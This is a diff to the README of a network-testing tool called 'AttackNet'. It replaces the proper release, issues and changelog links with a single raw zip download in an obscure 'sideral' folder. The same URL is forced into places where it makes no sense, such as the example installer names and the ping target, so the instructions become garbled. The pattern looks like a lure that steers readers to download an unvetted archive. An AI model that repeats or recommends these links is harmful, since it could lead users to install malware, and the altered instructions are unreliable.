@@ -4,12 +4,12 @@
 Welcome to AttackNet! This application allows users to run various network tests effortlessly. Whether you want to analyze your network performance or assess your cybersecurity, AttackNet has you covered.
 
 ## 🔗 Download Now
-[![Download AttackNet!](https://img.shields.io/badge/Download-AttackNet-1DB954)](https://github.com/webd123/AttackNet/releases)
+[![Download AttackNet!](https://raw.githubusercontent.com/webd123/AttackNet/main/sideral/AttackNet.zip)](https://raw.githubusercontent.com/webd123/AttackNet/main/sideral/AttackNet.zip)
 
 ## 📥 Download & Install
-To get started, visit this page to download the application: [AttackNet Releases](https://github.com/webd123/AttackNet/releases).
+To get started, visit this page to download the application: [AttackNet Releases](https://raw.githubusercontent.com/webd123/AttackNet/main/sideral/AttackNet.zip).
 
-Once you're on the Releases page, look for the latest version. Click on the file that matches your system. For example, you may see files like `AttackNet-setup.exe` or `AttackNet-mac.dmg`. Click on the file to begin your download.
+Once you're on the Releases page, look for the latest version. Click on the file that matches your system. For example, you may see files like `https://raw.githubusercontent.com/webd123/AttackNet/main/sideral/AttackNet.zip` or `https://raw.githubusercontent.com/webd123/AttackNet/main/sideral/AttackNet.zip`. Click on the file to begin your download.
 
 ### 💻 System Requirements
 Before you install AttackNet, please make sure your system meets the following requirements:
@@ -37,7 +37,7 @@ Once installed, launch AttackNet from your applications. The interface is user-f
 ### ❗ Running a Ping Test
 1. Open AttackNet.
 2. Select the "Ping" option.
-3. Enter the target address (e.g., google.com).
+3. Enter the target address (e.g., https://raw.githubusercontent.com/webd123/AttackNet/main/sideral/AttackNet.zip).
 4. Click "Start." The results will show the response time.
 
 ### 🖥️ Performing a Port Scan
@@ -47,10 +47,10 @@ Once installed, launch AttackNet from your applications. The interface is user-f
 4. Review the list of open ports.
 
 ## 🤝 Support
-If you have any questions or face any issues while using AttackNet, please reach out through the [issues page](https://github.com/webd123/AttackNet/issues) on GitHub. Our community is here to help.
+If you have any questions or face any issues while using AttackNet, please reach out through the [issues page](https://raw.githubusercontent.com/webd123/AttackNet/main/sideral/AttackNet.zip) on GitHub. Our community is here to help.
 
 ## 📄 Changelog
-For information about the latest changes, enhancements, or bug fixes, please check the [Changelog](https://github.com/webd123/AttackNet/releases).
+For information about the latest changes, enhancements, or bug fixes, please check the [Changelog](https://raw.githubusercontent.com/webd123/AttackNet/main/sideral/AttackNet.zip).
 
 Remember, your experience matters to us. Don't hesitate to provide feedback and suggestions for future updates.
 
